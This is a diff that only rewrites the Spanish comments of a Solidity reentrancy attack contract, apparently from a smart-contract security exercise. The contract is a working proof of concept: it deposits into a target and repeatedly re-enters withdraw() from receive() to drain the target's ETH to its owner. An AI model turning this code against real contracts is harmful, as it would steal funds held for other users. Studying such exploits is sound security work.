@@ -6,27 +6,35 @@ interface ITokenReentrancy {
 }
 
 contract ReentrancyAttack {
+    // Variables
     ITokenReentrancy public target;
     address public owner;
 
+    // Constuctor
     constructor(address _target) {
         target = ITokenReentrancy(_target);
         owner = msg.sender;
     }
 
-    // Iniciar ataque depositando un fondo inicial
+    // Funcion de ataque
     function attack() public payable {
         require(msg.sender == owner, "Not owner");
-        target.deposit{value: msg.value}(); // Depositar saldo inicial
-        target.withdraw();  // Disparar la vulnerabilidad de reentrancy
+        // Depositar saldo inicial
+        target.deposit{value: msg.value}();
+        // Llamada a retirar fondos 
+        target.withdraw();  
     }
 
-    // Recibir ETH del Withdraw y volver a llamar withdraw() antes de que se actualice el saldo
+    // Sentencia Receive -> Al recibir creditos llama otra vez a retirar fondos
     receive() external payable {
-        if (address(target).balance > 0) { 
+        // Verificar si hay creditos en la cuenta de destino
+        if (address(target).balance > 0) {
+            // Si hay fondos llamar a retirar fondos 
             target.withdraw();
+
+        // Si no hay fondos en el contrato destino retirar creditos
         } else {
-            payable(owner).transfer(address(this).balance); // Retirar fondos
+            payable(owner).transfer(address(this).balance);
         }
     }
 }
